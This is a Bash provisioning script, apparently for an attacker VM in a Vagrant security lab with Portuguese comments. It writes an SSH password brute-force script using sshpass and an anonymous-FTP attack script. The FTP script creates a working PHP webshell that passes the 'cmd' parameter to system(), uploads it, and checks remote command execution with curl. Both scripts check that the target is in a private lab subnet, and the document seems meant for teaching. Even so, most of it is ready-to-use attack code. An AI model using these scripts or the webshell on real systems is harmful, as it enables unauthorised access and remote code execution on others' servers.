#!/usr/bin/env bash
set -e

export DEBIAN_FRONTEND=noninteractive

# Atualiza e instala ferramentas básicas para o atacante
apt-get update -y
apt-get upgrade -y

# Cliente ssh, nmap e utilitários
apt-get install -y openssh-client nmap net-tools curl

# Instala sshpass (apenas para demo em rede isolada) para permitir tentativas por senha não interativas.
# Aviso: sshpass facilita ataques por senha; só instalar em ambiente controlado para demonstração.
apt-get install -y sshpass

# Cria pasta compartilhada de resultados (host <-> VM)
mkdir -p /vagrant_shared/attacker_results
chown -R vagrant:vagrant /vagrant_shared

# Cria diretório local de scripts de demonstração
mkdir -p /home/vagrant/attack_scripts
chown -R vagrant:vagrant /home/vagrant/attack_scripts

# --- Cria o script de brute-force didático ---
cat > /home/vagrant/attack_scripts/brute_force.sh <<'BFS'
#!/usr/bin/env bash
# brute_force.sh
# Demo didática: tenta um pequeno wordlist de senhas no usuário 'professor' da victim.
# USAGE: ./brute_force.sh <target_ip> <wordlist_path>
# Segurança: aborta se target não estiver em rede privada 192.168.56.0/24

set -euo pipefail

TARGET="${1:-192.168.56.10}"
WORDLIST="${2:-/vagrant_shared/wordlists/passwords.txt}"
OUTLOG="/vagrant_shared/attacker_results/bruteforce_result.log"
PORT="${3:-22}"  # porta SSH, default 22

echo "=== brute_force.sh (demo) ===" | tee -a "$OUTLOG"
echo "Target: $TARGET" | tee -a "$OUTLOG"
echo "Port: $PORT" | tee -a "$OUTLOG"
echo "Wordlist: $WORDLIST" | tee -a "$OUTLOG"
echo "Time: $(date --iso-8601=seconds)" | tee -a "$OUTLOG"
echo "------" | tee -a "$OUTLOG"

# Safety check: only run inside 192.168.56.0/24
if [[ ! "$TARGET" =~ ^192\.168\.56\.[0-9]+$ ]]; then
  echo "[ERROR] Target $TARGET not in allowed private range 192.168.56.0/24. Aborting." | tee -a "$OUTLOG"
  exit 2
fi

# Ensure wordlist exists and is small (didactic)
if [ ! -f "$WORDLIST" ]; then
  echo "[INFO] Wordlist not found at $WORDLIST. Creating a tiny demo wordlist." | tee -a "$OUTLOG"
  mkdir -p "$(dirname "$WORDLIST")"
  cat > "$WORDLIST" <<EOF
123456
password
prof123
toor
admin
EOF
fi

# Limit attempts: for demo, try at most first 10 lines
MAX_TRIES=10
TRY=0
SUCCESS=0

while read -r PASS && [ $TRY -lt $MAX_TRIES ]; do
  TRY=$((TRY+1))
  echo "[TRY $TRY] attempting password: $PASS" | tee -a "$OUTLOG"

  # Use sshpass to attempt password (connect timeout short). StrictHostKeyChecking=no to avoid interactive trust prompt.
  if sshpass -p "$PASS" ssh -p "$PORT" -o StrictHostKeyChecking=no -o ConnectTimeout=5 -o BatchMode=yes -o UserKnownHostsFile=/dev/null professor@"$TARGET" 'echo "LOGIN_OK"' 2>/dev/null | grep -q "LOGIN_OK"; then
    echo "[SUCCESS] password found: $PASS" | tee -a "$OUTLOG"
    SUCCESS=1
    echo "$PASS" > /vagrant_shared/attacker_results/found_password.txt
    break
  else
    echo "[FAIL] $PASS" | tee -a "$OUTLOG"
  fi
done < "$WORDLIST"

if [ "$SUCCESS" -eq 0 ]; then
  echo "[RESULT] No password found in first $MAX_TRIES attempts." | tee -a "$OUTLOG"
else
  echo "[RESULT] Success — check /vagrant_shared/attacker_results/found_password.txt" | tee -a "$OUTLOG"
fi

echo "End time: $(date --iso-8601=seconds)" | tee -a "$OUTLOG"
BFS

# garante permissões e dono
chmod +x /home/vagrant/attack_scripts/brute_force.sh
chown -R vagrant:vagrant /home/vagrant/attack_scripts

# --- Cria o script de ataque FTP ---
cat > /home/vagrant/attack_scripts/attack_ftp.sh <<'FTP_ATTACK'
#!/usr/bin/env bash
# attack_ftp.sh
# Demo: Exploração de FTP anônimo com upload habilitado
# USAGE: ./attack_ftp.sh <target_ip>
# Demonstra: Acesso anônimo + upload de webshell + execução remota

set -euo pipefail

TARGET="${1:-192.168.56.10}"
OUTLOG="/vagrant_shared/attacker_results/ftp_attack_result.log"
FTP_PORT=21

echo "========================================" | tee "$OUTLOG"
echo "  FTP Anonymous Attack Demo" | tee -a "$OUTLOG"
echo "========================================" | tee -a "$OUTLOG"
echo "Target: $TARGET:$FTP_PORT" | tee -a "$OUTLOG"
echo "Time: $(date --iso-8601=seconds)" | tee -a "$OUTLOG"
echo "" | tee -a "$OUTLOG"

# Safety check: only run inside 192.168.56.0/24
if [[ ! "$TARGET" =~ ^192\.168\.56\.[0-9]+$ ]]; then
  echo "[ERROR] Target $TARGET not in allowed private range. Aborting." | tee -a "$OUTLOG"
  exit 2
fi

# Verificar se FTP está acessível
echo "[*] Step 1: Verificando serviço FTP..." | tee -a "$OUTLOG"
if ! nc -zv -w3 "$TARGET" "$FTP_PORT" 2>&1 | tee -a "$OUTLOG"; then
  echo "[FAIL] Porta FTP $FTP_PORT não está acessível" | tee -a "$OUTLOG"
  exit 1
fi
echo "[OK] FTP está acessível" | tee -a "$OUTLOG"
echo "" | tee -a "$OUTLOG"

# Testar acesso anônimo
echo "[*] Step 2: Testando acesso anônimo..." | tee -a "$OUTLOG"
ftp -inv "$TARGET" <<EOF > /tmp/ftp_test.log 2>&1
user anonymous ""
ls
bye
EOF

if grep -q "230 Login successful" /tmp/ftp_test.log; then
  echo "[SUCCESS] Login anônimo permitido!" | tee -a "$OUTLOG"
  cat /tmp/ftp_test.log | tee -a "$OUTLOG"
else
  echo "[FAIL] Login anônimo não funcionou" | tee -a "$OUTLOG"
  cat /tmp/ftp_test.log | tee -a "$OUTLOG"
  exit 1
fi
echo "" | tee -a "$OUTLOG"

# Criar webshell PHP maliciosa
echo "[*] Step 3: Criando webshell PHP..." | tee -a "$OUTLOG"
cat > /tmp/backdoor.php <<'WEBSHELL'
<?php
// Webshell simples para demonstração
// ATENÇÃO: Apenas para ambiente controlado!

echo "<html><head><title>Shell Access</title></head><body>";
echo "<h2>Remote Command Execution - Demo</h2>";
echo "<form method='GET'>";
echo "Command: <input type='text' name='cmd' size='50'>";
echo "<input type='submit' value='Execute'>";
echo "</form><hr><pre>";

if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    echo "$ " . htmlspecialchars($cmd) . "\n\n";
    system($cmd);
}

echo "</pre></body></html>";
?>
WEBSHELL

echo "[OK] Webshell criada em /tmp/backdoor.php" | tee -a "$OUTLOG"
echo "" | tee -a "$OUTLOG"

# Upload da webshell via FTP
echo "[*] Step 4: Fazendo upload da webshell via FTP..." | tee -a "$OUTLOG"
ftp -inv "$TARGET" <<EOF > /tmp/ftp_upload.log 2>&1
user anonymous ""
cd upload
binary
put /tmp/backdoor.php
ls
bye
EOF

if grep -q "Transfer complete" /tmp/ftp_upload.log; then
  echo "[SUCCESS] Upload concluído!" | tee -a "$OUTLOG"
  cat /tmp/ftp_upload.log | tee -a "$OUTLOG"
else
  echo "[WARNING] Upload pode ter falhadо" | tee -a "$OUTLOG"
  cat /tmp/ftp_upload.log | tee -a "$OUTLOG"
fi
echo "" | tee -a "$OUTLOG"

# Criar arquivo de texto malicioso também
echo "[*] Step 5: Criando arquivo de exfiltração de dados..." | tee -a "$OUTLOG"
cat > /tmp/steal_data.txt <<'STEAL'
=== Dados Confidenciais Exfiltrados ===
Este arquivo demonstra como um atacante pode usar FTP para:
1. Fazer upload de backdoors
2. Exfiltrar dados sensíveis
3. Manter persistência no sistema

Próximos passos do atacante:
- Acessar webshell via HTTP
- Escalar privilégios
- Instalar backdoor persistente
STEAL

ftp -inv "$TARGET" <<EOF > /tmp/ftp_upload2.log 2>&1
user anonymous ""
cd upload
put /tmp/steal_data.txt exfiltrated_data.txt
bye
EOF

echo "[OK] Arquivo de demonstração enviado" | tee -a "$OUTLOG"
echo "" | tee -a "$OUTLOG"

# Enumerar arquivos no servidor FTP
echo "[*] Step 6: Enumerando arquivos no servidor FTP..." | tee -a "$OUTLOG"
ftp -inv "$TARGET" <<EOF > /tmp/ftp_enum.log 2>&1
user anonymous ""
ls -la
cd upload
ls -la
bye
EOF

echo "[INFO] Conteúdo do servidor FTP:" | tee -a "$OUTLOG"
cat /tmp/ftp_enum.log | tee -a "$OUTLOG"
echo "" | tee -a "$OUTLOG"

# Testar acesso à webshell via HTTP
echo "[*] Step 7: Tentando acessar webshell via HTTP..." | tee -a "$OUTLOG"
echo "[INFO] Se Apache estiver rodando, tente acessar:" | tee -a "$OUTLOG"
echo "       http://$TARGET/upload/backdoor.php" | tee -a "$OUTLOG"
echo "       ou" | tee -a "$OUTLOG"
echo "       http://$TARGET/backdoor.php" | tee -a "$OUTLOG"
echo "" | tee -a "$OUTLOG"

# Verificar se consegue executar comando via webshell
if command -v curl &> /dev/null; then
  echo "[*] Testando execução remota via webshell..." | tee -a "$OUTLOG"
  
  # Tentar diferentes localizações possíveis
  for path in "/upload/backdoor.php" "/backdoor.php" "/../backdoor.php"; do
    echo "[INFO] Tentando: http://$TARGET$path?cmd=whoami" | tee -a "$OUTLOG"
    RESPONSE=$(curl -s "http://$TARGET$path?cmd=whoami" 2>&1 || echo "FAILED")
    
    if [[ "$RESPONSE" != "FAILED" ]] && [[ "$RESPONSE" =~ (www-data|apache|root) ]]; then
      echo "[SUCCESS] Webshell acessível e funcional!" | tee -a "$OUTLOG"
      echo "[OUTPUT]" | tee -a "$OUTLOG"
      echo "$RESPONSE" | tee -a "$OUTLOG"
      break
    fi
  done
else
  echo "[INFO] curl não disponível. Instale para testar webshell automaticamente." | tee -a "$OUTLOG"
fi
echo "" | tee -a "$OUTLOG"

# Resumo final
echo "========================================" | tee -a "$OUTLOG"
echo "  RESUMO DO ATAQUE FTP" | tee -a "$OUTLOG"
echo "========================================" | tee -a "$OUTLOG"
echo "[✓] Acesso anônimo: CONFIRMADO" | tee -a "$OUTLOG"
echo "[✓] Upload de arquivos: PERMITIDO" | tee -a "$OUTLOG"
echo "[✓] Webshell enviada: /tmp/backdoor.php -> FTP" | tee -a "$OUTLOG"
echo "" | tee -a "$OUTLOG"
echo "IMPACTO:" | tee -a "$OUTLOG"
echo "- Execução remota de código (RCE)" | tee -a "$OUTLOG"
echo "- Possível escalação de privilégios" | tee -a "$OUTLOG"
echo "- Exfiltração de dados sensíveis" | tee -a "$OUTLOG"
echo "- Persistência no sistema" | tee -a "$OUTLOG"
echo "" | tee -a "$OUTLOG"
echo "CVSS Score: 9.8 (CRÍTICO)" | tee -a "$OUTLOG"
echo "" | tee -a "$OUTLOG"
echo "End time: $(date --iso-8601=seconds)" | tee -a "$OUTLOG"
echo "Log completo salvo em: $OUTLOG" | tee -a "$OUTLOG"

# Salvar evidências
cp /tmp/backdoor.php /vagrant_shared/attacker_results/backdoor_uploaded.php
echo "$TARGET" > /vagrant_shared/attacker_results/ftp_target.txt
FTP_ATTACK

chmod +x /home/vagrant/attack_scripts/attack_ftp.sh
chown vagrant:vagrant /home/vagrant/attack_scripts/attack_ftp.sh

# Instalar cliente FTP e ferramentas necessárias
apt-get install -y ftp netcat-openbsd curl

# Touch result file to ensure shared path exists
touch /vagrant_shared/attacker_results/attack.log
chown vagrant:vagrant /vagrant_shared/attacker_results/attack.log || true

echo "Provision attacker finished at $(date)" > /vagrant_shared/attacker_provision_done.txt

